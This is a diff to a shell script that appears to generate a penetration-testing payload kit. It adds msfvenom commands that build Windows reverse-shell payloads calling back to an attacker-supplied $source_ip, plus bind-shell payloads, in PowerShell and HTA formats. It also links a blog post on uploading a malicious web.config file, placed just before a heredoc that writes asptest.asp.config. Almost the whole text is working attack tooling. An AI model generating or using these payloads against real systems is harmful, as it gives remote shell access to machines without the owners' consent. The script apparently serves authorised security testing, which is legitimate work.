@@ -51,7 +51,12 @@ cd public/payloads_windows
         banner "payloads_windows: shell_reverse_tcp_*.ps1"
         msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread  -f psh -o shell_reverse_tcp_x86.ps1
         echo ""
-        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread -f psh -o shell_reverse_tcp_x64.ps1   
+        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread -f psh -o shell_reverse_tcp_x64.ps1  
+
+        banner "payloads_windows: shell_reverse_tcp_*.hta"
+        msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread  -f hta-psh -o shell_reverse_tcp_x86.hta
+        echo ""
+        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread -f hta-psh -o shell_reverse_tcp_x64.hta  
             
         # Bind shells
         banner "payloads_windows: shell_reverse_tcp_*.exe"
@@ -95,7 +100,12 @@ cd public/payloads_windows
         echo ""
         msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f psh > shell_bind_tcp_x64.ps1
 
+        banner "payloads_windows: shell_bind_tcp_*.hta"
+        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f hta-psh > shell_bind_tcp_x86.hta
+        echo ""
+        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f hta-psh > shell_bind_tcp_x64.hta
 
+# https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
 banner "payloads_windows: asptest.asp.config"
 cat <<\EOT >asptest.asp.config
 <?xml version="1.0" encoding="UTF-8"?>
